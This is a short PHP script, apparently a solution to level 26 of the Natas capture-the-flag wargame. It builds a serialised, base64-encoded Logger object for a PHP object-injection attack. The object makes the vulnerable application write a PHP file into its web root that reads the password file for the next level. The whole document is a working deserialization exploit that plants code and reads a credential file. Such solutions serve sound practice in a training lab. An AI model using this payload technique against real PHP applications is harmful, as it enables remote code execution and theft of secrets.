<?php
class Logger{
	private $logFile;
	private $initMsg;
	private $exitMsg;

	function __construct(){
		// initialise variables
		$this->initMsg="doctormartin67";
		$this->exitMsg="<?php echo file_get_contents('/etc/natas_webpass/natas27'); ?>\n";
		$this->logFile = "/var/www/natas/natas26/img/passwd1.php";
	}
}

$o = new Logger();
echo base64_encode(serialize($o));
?>
